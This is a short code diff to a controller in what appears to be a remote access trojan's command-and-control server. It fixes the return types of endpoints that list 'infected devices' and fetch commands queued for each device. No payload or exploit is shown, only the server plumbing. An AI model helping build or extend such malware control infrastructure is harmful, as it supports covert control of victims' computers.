@@ -29,13 +29,13 @@ namespace Rat_Server.Controllers
         }
 
         [HttpGet("GetAllInfectedDevices")]
-        public ActionResult<List<DeviceCommandDto>> GetAllInfectedDevices()
+        public ActionResult<List<Device>> GetAllInfectedDevices()
         {
             return Ok(_context.Devices.ToList());
         }
 
         [HttpGet("GetDeviceCommands/{deviceId}")]
-        public ActionResult<List<Device>> GetDeviceCommands(string deviceId)
+        public ActionResult<List<DeviceCommandDto>> GetDeviceCommands(string deviceId)
         {
             if (_context.Devices.Find(new Guid(deviceId)) == null)
             {
